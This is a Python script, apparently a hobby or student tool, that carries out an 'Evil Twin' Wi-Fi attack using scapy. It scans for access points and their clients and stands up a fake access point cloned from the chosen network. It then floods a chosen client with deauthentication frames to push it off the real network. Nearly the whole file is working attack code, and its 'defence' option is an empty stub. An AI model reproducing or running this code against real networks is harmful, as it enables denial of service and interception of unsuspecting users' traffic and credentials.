from scapy.all import *
from threading import *
import os
import time

import fakeAP as fake_ap
# import CreateConf as cc
# import MonitorMode as mm


# Preparing the card for monitor mode
def switchToMonitorMode(sniff_network_adapter):
    os.system('sudo ifconfig %s down' % sniff_network_adapter)
    os.system('sudo iwconfig %s mode monitor' % sniff_network_adapter)
    os.system('sudo ifconfig %s up' % sniff_network_adapter)


# ----- Scanning the area, searching for wifi access ------------

AP_List = []

def AP_Scaning(sniff_network_adapter):
    
    print("Scanning for Access Points with %s..." % sniff_network_adapter)
    # Scan for 30 seconds
    sniff(iface = sniff_network_adapter, prn = PacketHandlerAP, timeout = 30)

    rescan = input("\nDo you want to rescan? [y/n]: ")
    if(rescan == "y"):
        AP_Scaning(sniff_network_adapter)

# ------------------------------------------------------------------
countAP = 0

def PacketHandlerAP(packet):
    global countAP
    # if packet has 802.11 layer (Beacoin) and filter type & subtype of packets
    if packet.haslayer(Dot11):
        if (packet.type == 0 and packet.subtype == 8):
            if [packet.addr2, packet.info, int(ord(packet[Dot11Elt:3].info))] not in AP_List:
                #AP, SSID, Channel
                AP_List.append([packet.addr2, packet.info,
                               int(ord(packet[Dot11Elt:3].info))])
                print("Index: %s | Access Point MAC: %s | with SSID: %s  | Channel: %d" %(countAP,packet.addr2,packet.info, int(ord(packet[Dot11Elt:3].info))))
                countAP = countAP + 1

# -------- Selecting which access point(WLAN) we want to attack --------------

def attackAP(sniff_network_adapter, fakeAP_network_adapter):
    result = input("Choose number of AP to attack: ")

    ssid = extractSSID(str(AP_List[int(result)][1]))
    print("Selected access point: " + ssid)
    
    #For FakeAP configuration files
    Channel_victim = int(AP_List[int(result)][2])
    create_conf_file(fakeAP_network_adapter, ssid, Channel_victim)

    # Change your network card to the same channel of AP victim
    setChannel(Channel_victim, sniff_network_adapter)

    # Client scanning from chosen AP
    MAC_victim = AP_List[int(result)][0]
    clientScaning(MAC_victim, sniff_network_adapter)


def extractSSID(ssid):
    return ssid[2:len(ssid)-1]


def create_conf_file(iface, ssid, channel):
    fake_ap.Create_hostapd(iface, ssid, channel)
    fake_ap.Create_dnsmasq(iface)


def setChannel(channel, sniff_network_adapter):
    os.system('iwconfig %s channel %d' % (sniff_network_adapter, channel))

clientList = []
target_mac = ""

def clientScaning(MAC_victim, sniff_network_adapter):
    print("Scanning for clients of AP: %s..." %MAC_victim)
    global target_mac
    target_mac = MAC_victim
    sniff(iface = sniff_network_adapter, prn = PacketHandlerClients, timeout=30)


counter_clients = 0

def PacketHandlerClients(packet):
    global clientList
    global counter_clients
    #
    if ((packet.addr2 == target_mac or packet.addr3 == target_mac) and packet.addr1 != "ff:ff:ff:ff:ff:ff"):
        #
        if packet.addr1 not in clientList:
            #
            if packet.addr2 != packet.addr1 and packet.addr1 != packet.addr3:
                clientList.append(packet.addr1)
                print("Index: %s | MAC Client: %s" %(counter_clients,packet.addr1))
                counter_clients += 1


# -------------Selecting a victim and performing an Evil-Twin attack ---------------

# Disconnects the target client from the network
def attackClient(sniff_network_adapter, fakeAP_network_adapter):
    while len(clientList) == 0:
        print("No clients found, searching again...")
        clientScaning(target_mac, sniff_network_adapter)

    rescan = input("Do you want to rescan? [y/n]: ")
    if(rescan == "y"):
        clientScaning(target_mac, sniff_network_adapter)

    choice = input("Choose index of client to attack: ")

    # fake_ap.setup(fakeAP_network_adapter)
    # finish = input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
    
    setupAP(fakeAP_network_adapter)

    # disconnectThread = threading.Thread(
    #     target=DisconnectAttack, args=(choice,sniff_network_adapter))
    # disconnectThread.daemon = True
    # disconnectThread.start()
    DisconnectAttack(choice, sniff_network_adapter)

    time.sleep(3)

allow = True

def setupAP(fakeAP_network_adapter):
    allow = False
    print('---> Raising up Fake AP spot\n')
    fake_ap.init_setting()
    fake_ap.AP_on(fakeAP_network_adapter)
    finish = input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")

def DisconnectAttack(choice, sniff_network_adapter):
        # send the packet
        for y in range(1000):
            dot11 = Dot11(addr1 = clientList[int(choice)], addr2=target_mac, addr3=target_mac)
            packet = RadioTap()/dot11/Dot11Deauth()
            sendp(packet, iface=sniff_network_adapter, count=30, inter = .001)

        print('---> Finishing sending prob requests to AP...\n')


def Change_back_airmon(iface):
    os.system("sudo airmon-ng stop "+ iface)
    os.system("sudo systemctl start NetworkManager")
    os.system("clear")

# =================================================================================

if __name__ == "__main__":
    os.system("iwconfig")  # show the list of wlan
    sniff_network_adapter = input("Enter your network adapter for sniff packets (wlan0/wlan1): ")
    fakeAP_network_adapter = input("Enter your network adapter for setup fake AP (wlan0/wlan1): ")
    
    switchToMonitorMode(sniff_network_adapter)
    
    print("~~~~~~~~~~~~~~ Welcome ~~~~~~~~~~~~~~\n")
    print("1.Evil Twin Attack\n")
    print("2.Evil Twin Active Defence\n")
    choise = input("Choose option: ")
    if choise == 1:
        #Stages of Evil-Twin attack
        AP_Scaning(sniff_network_adapter)
        attackAP(sniff_network_adapter, fakeAP_network_adapter)
        attackClient(sniff_network_adapter, fakeAP_network_adapter)
    elif choise == 2:
        print("defence")
    else:
        choise = input("Choose option: ")
        
    #End
    Change_back_airmon(sniff_network_adapter)
    fake_ap.Delete_conf_files()
